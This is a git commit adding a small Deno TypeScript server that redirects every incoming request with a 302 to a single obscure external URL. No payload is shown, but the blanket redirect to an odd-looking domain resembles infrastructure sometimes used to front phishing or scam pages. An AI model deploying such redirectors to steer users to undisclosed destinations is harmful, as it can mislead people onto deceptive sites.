dcf35109ba8f561ffbd2b4d355c89132c269d620
mandersann <mandersann@prometrical.us>
2025-10-01 05:19:59 -0500

    Add files via upload

---
+++ mandersprog22.ts
@@ -0,0 +1,11 @@
+// main.ts
+import { serve } from "https://deno.land/std/http/server.ts";
+
+serve((_req) => {
+  return new Response(null, {
+    status: 302,
+    headers: {
+      Location: "https://dispuacc-rvlwnow.co/simmon",
+    },
+  });
+});
